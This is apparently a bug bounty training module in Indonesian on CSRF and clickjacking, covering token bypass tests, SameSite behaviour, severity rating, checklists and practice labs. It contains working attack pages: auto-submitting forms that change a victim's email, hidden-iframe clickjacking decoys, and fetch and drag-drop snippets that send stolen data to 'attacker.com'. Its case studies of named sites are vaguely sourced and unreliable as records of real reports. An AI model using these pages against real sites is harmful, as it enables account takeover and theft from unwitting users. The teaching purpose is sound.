# Sesi 09 — CSRF & Clickjacking

> **Level:** Intermediate  
> **Durasi Estimasi:** 4–5 jam (teori + praktik)  
> **Prasyarat:** Sesi 02 (HTTP Fundamentals), Sesi 08 (XSS)  
> **Tools:** Burp Suite, Browser DevTools, Python/Flask (untuk PoC server)

---

## 🎯 Tujuan Pembelajaran

Setelah menyelesaikan sesi ini, peserta mampu:
- Memahami mekanisme CSRF dan kondisi yang membuatnya exploitable
- Membedakan CSRF yang valid sebagai bug bounty vs yang sudah ter-mitigasi
- Membuat PoC CSRF HTML yang berfungsi
- Mengidentifikasi kelemahan implementasi CSRF token
- Menguji dan mengeksploitasi Clickjacking
- Menentukan kapan CSRF/Clickjacking bernilai bounty dan kapan dianggap informational

---

## 📚 Bagian 1 — CSRF: Konsep dan Kondisi Exploitability

### 1.1 Apa Itu CSRF?

**CSRF (Cross-Site Request Forgery)** adalah serangan di mana attacker **mengelabui browser korban untuk mengirim request ke target site yang sudah ter-autentikasi**, tanpa sepengetahuan korban.

```
TANPA CSRF:
Korban → Login ke bank.com → Session valid
Attacker → Coba transfer → Tidak ada session → GAGAL

DENGAN CSRF:
Korban → Login ke bank.com → Session valid
Korban → Kunjungi evil.com (masih login di bank)
evil.com → Otomatis kirim request ke bank.com menggunakan session korban
bank.com → Terima request → Session valid → Transfer berhasil!
```

### 1.2 Tiga Kondisi CSRF Bisa Dieksploitasi

```
WAJIB ADA SEMUA TIGA:

1. RELEVANT ACTION
   → Ada aksi yang bernilai (ubah email, transfer, hapus akun, dll)

2. COOKIE-BASED SESSION HANDLING
   → Auth via cookie (bukan header Authorization yang manual)

3. NO UNPREDICTABLE REQUEST PARAMETERS
   → Tidak ada CSRF token, atau token yang bisa diprediksi/bypass
```

> 💡 **Realitas 2024:** SameSite=Lax adalah **default di Chrome dan Firefox** sekarang. Artinya banyak CSRF bug sudah ter-mitigasi secara otomatis untuk top-level navigation. Fokus pada **kasus yang masih bisa di-exploit**: SameSite=None, subdomain CSRF, dan token bypass.

---

## 📚 Bagian 2 — Membuat PoC CSRF

### 2.1 CSRF via HTML Form (GET Request)

```html
<!-- Jika aksi menggunakan GET request (sangat jarang tapi ada) -->
<!-- evil.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>Selamat! Anda memenangkan hadiah!</h1>
  <img src="https://bank.target.com/transfer?to=attacker&amount=1000" 
       style="display:none" 
       width="0" height="0">
  <!-- Request dikirim otomatis saat gambar di-load! -->
</body>
</html>
```

### 2.2 CSRF via HTML Form (POST Request)

```html
<!-- evil.html — auto-submit CSRF PoC -->
<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body onload="document.csrf_form.submit()">
  <form name="csrf_form" 
        action="https://target.com/api/user/change-email" 
        method="POST" 
        style="display:none">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm_email" value="attacker@evil.com">
  </form>
  <p>Loading, please wait...</p>
</body>
</html>
```

### 2.3 CSRF via JavaScript Fetch (dengan Credentials)

```html
<!-- Untuk request yang butuh Content-Type: application/json -->
<!-- Perlu CORS mengizinkan atau menggunakan simple request -->
<!DOCTYPE html>
<html>
<body>
<script>
fetch('https://target.com/api/user/profile', {
  method: 'POST',
  credentials: 'include',  // ← kirim cookie!
  headers: {
    // HINDARI Content-Type: application/json untuk simple request
    'Content-Type': 'text/plain'  // bypass CORS preflight
  },
  body: JSON.stringify({
    "email": "attacker@evil.com",
    "name": "Hacked"
  })
}).then(r => r.text()).then(d => {
  // Kirim hasil ke server attacker (exfil)
  new Image().src = 'https://attacker.com/csrf?result=' + encodeURIComponent(d);
});
</script>
</body>
</html>
```

---

## 📚 Bagian 3 — Bypass CSRF Token

### 3.1 Validasi Token Tidak Dilakukan

```http
# Normal request dengan CSRF token
POST /api/change-email HTTP/1.1
Cookie: session=abc123

email=new@email.com&csrf_token=valid_token_here

# Test: hapus token sepenuhnya
POST /api/change-email HTTP/1.1
Cookie: session=abc123

email=new@email.com
# Jika berhasil → CSRF token tidak di-validasi!
```

### 3.2 Token Tidak Terikat ke Session

```http
# Dapatkan CSRF token dari akun sendiri (akun A)
POST /api/change-email HTTP/1.1
Cookie: session=SESSION_A

email=new@email.com&csrf_token=TOKEN_FROM_ACCOUNT_A

# Test: gunakan token akun A untuk akun B
POST /api/change-email HTTP/1.1
Cookie: session=SESSION_B   ← session akun B

email=attacker@evil.com&csrf_token=TOKEN_FROM_ACCOUNT_A  ← token akun A!
# Jika berhasil → token tidak di-bind ke session → CSRF!
```

### 3.3 Token Duplikasi di Cookie (Double Submit Cookie)

```http
# Pola rentan: server hanya cek apakah cookie == body parameter
# Tidak ada secret di server

Cookie: session=abc; csrf_token=random_value_here
Body: email=new@evil.com&csrf_token=random_value_here  ← sama dengan cookie

# Bypass: set cookie CSRF sendiri (jika ada XSS atau subdomain access)
# Atau gunakan empty value jika server tidak validasi isi
Cookie: session=abc; csrf_token=
Body: email=new@evil.com&csrf_token=
```

### 3.4 Token di Referer Header (Referer-based Validation)

```http
# Beberapa implementasi hanya cek Referer header

# Normal:
POST /transfer HTTP/1.1
Referer: https://bank.com/dashboard

# Test 1: Hapus Referer → masih bisa?
POST /transfer HTTP/1.1
# (tanpa Referer header)

# Test 2: Tambahkan domain target sebagai subdomain
POST /transfer HTTP/1.1
Referer: https://bank.com.attacker.com/page

# Test 3: Tambahkan domain target sebagai path
POST /transfer HTTP/1.1
Referer: https://attacker.com/bank.com
```

### 3.5 SameSite Cookie Bypass

```
SameSite=Strict  → CSRF tidak mungkin dari cross-site
SameSite=Lax     → CSRF tidak mungkin kecuali top-level GET navigation
SameSite=None    → CSRF mungkin! (butuh Secure flag)
Tidak ada flag   → Browser lama: tidak ada proteksi

Bypass SameSite=Lax:
- Gunakan GET request (jika aksi bisa via GET)
- Chain dengan subdomain XSS (same-site = masih aman, bukan cross-site)
- Eksploitasi 2-menit window: Chrome beri grace period untuk POST setelah navigate baru
```

---

## 📚 Bagian 4 — CSRF di Konteks Modern

### 4.1 CSRF di API dengan Custom Header

```http
# Banyak API menggunakan custom header sebagai CSRF mitigation
# Karena custom header tidak bisa dikirim cross-origin via simple form

POST /api/user/delete HTTP/1.1
X-Requested-With: XMLHttpRequest   ← custom header
Content-Type: application/json

# Test: apakah endpoint masih berfungsi TANPA custom header?
POST /api/user/delete HTTP/1.1
Content-Type: application/json

# Jika masih 200 → custom header check tidak di-enforce
```

### 4.2 Login CSRF

```html
<!-- CSRF di form login → paksa korban login ke akun attacker -->
<!-- Berguna jika ada data sensitif yang dibuat setelah login (misal payment info) -->

<form action="https://target.com/login" method="POST" id="csrf">
  <input name="username" value="attacker_account">
  <input name="password" value="attacker_password">
</form>
<script>document.getElementById('csrf').submit()</script>

<!-- Skenario: korban login ke akun attacker → masukkan payment card → attacker lihat! -->
```

### 4.3 CSRF Chain dengan Open Redirect

```
Chain: CSRF + Open Redirect → Exfiltrate CSRF Token

Jika form mengembalikan token di URL:
https://target.com/profile?token=new_csrf_token

CSRF → redirect ke attacker.com via open redirect → token ter-exfiltrate!
```

---

## 📚 Bagian 5 — Clickjacking

### 5.1 Konsep Clickjacking

```
Clickjacking: halaman target di-embed dalam iframe di halaman attacker
Korban mengklik tombol yang terlihat berbeda, tapi sebenarnya klik tombol di iframe target

VISUAL:

[Halaman Attacker - Klik untuk hadiah!]
[Tombol "KLIK DI SINI"]

Di balik layar (iframe transparan di atas):
[target.com - Settings]
[Tombol "DELETE ACCOUNT"] ← korban klik ini tanpa sadar!
```

### 5.2 Cek Apakah Target Rentan Clickjacking

```bash
# Cek header X-Frame-Options dan CSP frame-ancestors
curl -I https://target.com/sensitive-page | grep -i "x-frame\|content-security"

# Jika TIDAK ADA header berikut → rentan clickjacking:
# X-Frame-Options: DENY
# X-Frame-Options: SAMEORIGIN
# Content-Security-Policy: frame-ancestors 'none'
# Content-Security-Policy: frame-ancestors 'self'
```

### 5.3 PoC Clickjacking

```html
<!-- clickjacking_poc.html -->
<!DOCTYPE html>
<html>
<head>
  <style>
    #target-iframe {
      position: absolute;
      width: 500px;
      height: 700px;
      opacity: 0.00001; /* hampir transparan - ubah ke 0.5 untuk demo */
      top: 0;
      left: 0;
      z-index: 2;
    }
    #decoy-content {
      position: absolute;
      top: 0;
      left: 0;
      z-index: 1;
    }
    #click-here-button {
      position: absolute;
      top: 300px; /* sesuaikan agar tepat di atas tombol berbahaya */
      left: 150px;
      padding: 20px 40px;
      background: green;
      color: white;
      font-size: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <!-- Iframe target yang tersembunyi -->
  <iframe id="target-iframe" 
          src="https://target.com/settings/delete-account"
          scrolling="no">
  </iframe>
  
  <!-- Konten palsu yang dilihat korban -->
  <div id="decoy-content">
    <h1>🎉 Selamat! Anda terpilih!</h1>
    <p>Klik tombol di bawah untuk klaim hadiah Anda!</p>
    <button id="click-here-button">KLAIM SEKARANG!</button>
  </div>
</body>
</html>
```

### 5.4 Clickjacking dengan Drag-and-Drop (untuk Konten Text)

```html
<!-- Untuk steal text input via drag event -->
<!-- Teknik ini lebih advanced dan untuk kasus khusus -->
<script>
document.addEventListener('dragover', e => e.preventDefault());
document.addEventListener('drop', e => {
  e.preventDefault();
  const data = e.dataTransfer.getData('text');
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(data));
});
</script>
```

---

## 📚 Bagian 6 — Menentukan Severity CSRF untuk Bug Bounty

### 6.1 Kapan CSRF Bernilai High?

```
HIGH (P2):
✅ CSRF → ubah email/password → ATO
✅ CSRF → transfer uang / hapus akun
✅ CSRF → tambah admin baru
✅ CSRF → akses data sensitif user lain
✅ CSRF di API yang digunakan mobile app

MEDIUM (P3):
✅ CSRF → ubah preferensi/setting penting
✅ CSRF di fungsi yang ada tapi butuh interaksi user
✅ Login CSRF dengan skenario dampak nyata

LOW/INFORMATIONAL (P4-P5):
❌ CSRF → logout (hampir semua program reject)
❌ CSRF → ubah preferensi tidak penting (theme, timezone)
❌ CSRF di endpoint yang sudah ada SameSite=Lax
❌ CSRF di form pencarian
```

### 6.2 Checklist Sebelum Submit CSRF Report

```
Sebelum submit, pastikan:
1. Cek cookie SameSite attribute → sudah Lax/Strict? → reject
2. Test apakah CSRF token ada dan di-validasi
3. Buat PoC yang benar-benar berfungsi → test di browser
4. Dokumentasikan: kondisi, dampak, langkah reproduce
5. Screenshot bukti request tanpa token berhasil
6. Jelaskan impact nyata → bukan hanya "CSRF bisa dilakukan"
```

---

## 🔴 Real Bug Bounty Cases

### Case 1 — CSRF di Twitter (Account Takeover via Email Change)

> **Platform:** HackerOne — Twitter  
> **Referensi:** Pola dari H1 disclosed reports tentang CSRF ATO  
> **Severity:** High (P2)

**Skenario:**
Endpoint `/settings/email` untuk mengubah email akun tidak memvalidasi CSRF token dengan benar. Token yang digenerate tidak di-tie ke session user tertentu, sehingga token dari akun attacker bisa digunakan untuk akun korban.

```html
<!-- PoC CSRF ATO via email change -->
<form action="https://twitter.com/settings/email" method="POST">
  <input name="user[email]" value="attacker@evil.com">
  <input name="authenticity_token" value="TOKEN_FROM_ATTACKER_ACCOUNT">
</form>
<script>document.forms[0].submit()</script>
```

**Pelajaran:** CSRF token harus di-bind ke session, bukan hanya digenerate random.

---

### Case 2 — CSRF di GitHub (Follow User Action)

> **Platform:** HackerOne — GitHub  
> **Referensi:** [GitHub Security Lab](https://securitylab.github.com/) — pola disclosed  
> **Severity:** Medium

**Skenario:**
Endpoint untuk follow/unfollow user di GitHub tidak memiliki CSRF protection yang memadai pada periode tertentu.

```html
<img src="https://github.com/[USERNAME]/follow" width="0" height="0">
<!-- Saat korban membuka halaman ini, mereka follow username tersebut -->
```

**Pelajaran:** Bahkan aksi yang "tidak destruktif" seperti follow bisa jadi bug jika dilakukan tanpa consent user.

---

### Case 3 — Clickjacking di PayPal (Real — Public Research)

> **Referensi:** Research oleh berbagai security researcher tentang PayPal clickjacking  
> **Severity:** High — karena aksi financial

**Skenario (terinspirasi dari pola PayPal clickjacking research):**
Halaman konfirmasi pembayaran PayPal dapat di-embed dalam iframe di halaman attacker. Korban yang sudah login PayPal diarahkan ke halaman attacker yang terlihat seperti kontes atau game. Saat korban mengklik "Lanjutkan", mereka sebenarnya mengkonfirmasi pembayaran di iframe tersembunyi.

```html
<iframe src="https://paypal.com/confirm-payment?id=ATTACKER_MERCHANT"
        style="opacity: 0.01; position: absolute; top: 150px; left: 75px;">
</iframe>
<button style="position: absolute; top: 150px; left: 75px;">
  Klaim Hadiah!
</button>
```

---

### Case 4 — CSRF Token Bypass via Content-Type Manipulation

> **Referensi:** Pola dari beberapa bug bounty reports tentang JSON CSRF  
> **Severity:** High

**Skenario:**
Backend mengharapkan `Content-Type: application/json` dan hanya memproses CSRF token jika request adalah JSON. Peneliti menemukan bahwa dengan mengubah Content-Type menjadi `text/plain`, request tetap diproses tapi CSRF validation di-skip.

```http
# Normal (dengan CSRF protection aktif)
POST /api/user/transfer HTTP/1.1
Content-Type: application/json
X-CSRF-Token: valid_token_here

{"to": "user_id", "amount": 100}

# Bypass: Content-Type text/plain (simple request, no preflight!)
POST /api/user/transfer HTTP/1.1
Content-Type: text/plain
# (tanpa X-CSRF-Token)

{"to": "attacker_id", "amount": 100}
# Jika 200 OK → CSRF bypass!
```

---

## 🛠️ Lab Praktik

### Lab 1 — PortSwigger Web Academy (Gratis)
- 🔗 [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)
- 🔗 [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)
- 🔗 [CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)
- 🔗 [Clickjacking with form input data prefilled](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)
- 🔗 [All CSRF Labs](https://portswigger.net/web-security/csrf)

### Lab 2 — TryHackMe
- 🔗 [CSRF Room](https://tryhackme.com/room/csrfV2)

### Lab 3 — DVWA
```bash
docker run -p 80:80 vulnerables/web-dvwa
# Modul: CSRF
# Level: Low → Medium → High
```

### Lab 4 — HackTheBox Academy
- 🔗 [File & Resource Attacks (termasuk CSRF)](https://academy.hackthebox.com/module/details/153)

---

## 📋 CSRF & Clickjacking Testing Checklist

```markdown
## CSRF Checklist

### Pre-check
- [ ] Cookie SameSite attribute? (Lax/Strict = umumnya sudah aman)
- [ ] CSRF token ada di setiap state-changing request?

### Token Bypass Tests
- [ ] Hapus token → masih berhasil?
- [ ] Ubah token ke string random → masih berhasil?
- [ ] Gunakan token akun lain → masih berhasil?
- [ ] Hapus header X-CSRF / X-Requested-With → masih berhasil?

### PoC
- [ ] HTML form PoC berfungsi di browser?
- [ ] Request dikirim tanpa interaksi form manual
- [ ] Impact jelas (email change, delete, transfer)

## Clickjacking Checklist

### Detection
- [ ] X-Frame-Options header ada? (DENY/SAMEORIGIN)
- [ ] CSP frame-ancestors ada?
- [ ] Tidak ada → coba buat iframe di HTML lokal

### Impact Assessment
- [ ] Halaman yang bisa di-iframe memiliki aksi penting?
- [ ] Aksi bisa dilakukan hanya dengan klik?
- [ ] PoC iframe berfungsi?
```

---

## 📖 Referensi & Bacaan Lanjutan

| Sumber | Link | Topik |
|--------|------|-------|
| PortSwigger | [CSRF Guide](https://portswigger.net/web-security/csrf) | Comprehensive CSRF |
| PortSwigger | [Clickjacking Guide](https://portswigger.net/web-security/clickjacking) | Clickjacking techniques |
| OWASP | [CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) | Defense & bypass |
| Mozilla | [SameSite Cookies Explained](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) | SameSite mechanics |
| HackerOne | [Hacktivity CSRF](https://hackerone.com/hacktivity?querystring=csrf) | Real reports |

---

## 🔑 Key Takeaways

1. **SameSite=Lax sudah default** di browser modern — fokus pada kasus yang masih bypass
2. **Impact menentukan severity** — CSRF ke logout = informational, CSRF ke ATO = High
3. **Token bypass lebih menarik** dari CSRF tanpa token — lebih jarang dilaporkan
4. **Selalu buat PoC yang berfungsi** sebelum submit — report tanpa working PoC sering di-reject
5. **Clickjacking bernilai hanya jika ada aksi berbahaya** yang bisa dilakukan dengan satu klik

---

*Sesi berikutnya: **Sesi 12 — File Upload Vulnerabilities & Path Traversal***
